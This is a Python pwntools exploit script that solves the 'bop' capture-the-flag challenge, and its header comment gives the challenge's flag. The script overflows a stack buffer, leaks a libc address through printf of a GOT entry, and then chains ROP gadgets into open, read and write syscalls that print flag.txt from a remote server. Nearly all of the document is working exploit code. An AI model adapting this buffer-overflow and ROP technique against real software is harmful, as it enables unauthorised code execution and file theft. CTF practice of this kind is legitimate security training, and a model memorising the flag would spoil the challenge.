# bop (pwn)
# dice{ba_da_ba_da_ba_be_bop_bop_bodda_bope_f8a01d8ec4e2}

from pwn import *
context.binary = 'bop'
context.terminal = 'kitty'

ALIGN = 0x000000000040101a # ret
PAD = 40
BSS = 0x00000000004040b0
rop = ROP(context.binary)
rop.raw(b"a" * PAD)
rop.raw(p64(ALIGN))
rop.printf(context.binary.got['gets'])
rop.raw(p64(ALIGN))
rop.gets(BSS)
rop.raw(p64(ALIGN))
rop.raw(p64(0x4012f9)) # main

r = remote("mc.ax", 30284)
#r = process(["./bop"])
#gdb.attach(r)

r.sendlineafter('? ', rop.chain())
d = r.recv(6)
# libc base
lcb = u64(d+b"\x00\x00") - 0x0000000000083970
print(hex(lcb))

r.sendline("flag.txt\x00")
rop = b"a" * PAD
SYSCALL = 0x00000000000630a9 + lcb # syscall, ret
RDI     = 0x00000000004013d3       # pop rdi, red
RSID    = 0x00000000004013d1       # pop rsi, pop rdx, ret
RAX     = 0x0000000000036174 + lcb # pop rax, ret
RDX     = 0x0000000000142c92 + lcb # pop rdx, ret
rop += p64(RAX) + p64(2) # open
rop += p64(RDI) + p64(BSS)
rop += p64(RSID) + p64(0) + p64(0)
rop += p64(RDX) + p64(0)
rop += p64(SYSCALL)
rop += p64(RAX) + p64(0) # read
rop += p64(RDI) + p64(3)
rop += p64(RSID) + p64(BSS) + p64(0)
rop += p64(RDX) + p64(64)
rop += p64(SYSCALL)
rop += p64(RAX) + p64(1) # write
rop += p64(RDI) + p64(1)
rop += p64(RSID) + p64(BSS) + p64(0)
rop += p64(RDX) + p64(64)
rop += p64(SYSCALL)
rop += p64(0x4012f9)
r.sendlineafter('? ', rop)
r.interactive()
